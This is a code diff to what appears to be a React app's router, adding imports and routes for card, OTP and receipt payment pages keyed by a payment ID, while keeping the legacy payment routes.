@@ -23,8 +23,11 @@ import PaymentBankSelector from "./pages/PaymentBankSelector";
 import PaymentCardInput from "./pages/PaymentCardInput";
 import PaymentBankLogin from "./pages/PaymentBankLogin";
 import PaymentCardForm from "./pages/PaymentCardForm";
+import PaymentCard from "./pages/PaymentCard";
 import PaymentOTPForm from "./pages/PaymentOTPForm";
+import PaymentOTP from "./pages/PaymentOTP";
 import PaymentReceiptPage from "./pages/PaymentReceiptPage";
+import PaymentReceipt from "./pages/PaymentReceipt";
 import TelegramTestPage from "./pages/TelegramTestPage";
 import NotFound from "./pages/NotFound";
 
@@ -57,6 +60,10 @@ const App = () => (
           <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
           <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
           <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
+          {/* Payment routes with paymentId parameter */}
+          <Route path="/pay/:id/card/:paymentId" element={<PaymentCard />} />
+          <Route path="/pay/:id/otp/:paymentId" element={<PaymentOTP />} />
+          <Route path="/pay/:id/receipt/:paymentId" element={<PaymentReceipt />} />
           {/* Legacy routes (kept for backwards compatibility) */}
           <Route path="/pay/:id/card" element={<PaymentCardForm />} />
           <Route path="/pay/:id/otp" element={<PaymentOTPForm />} />
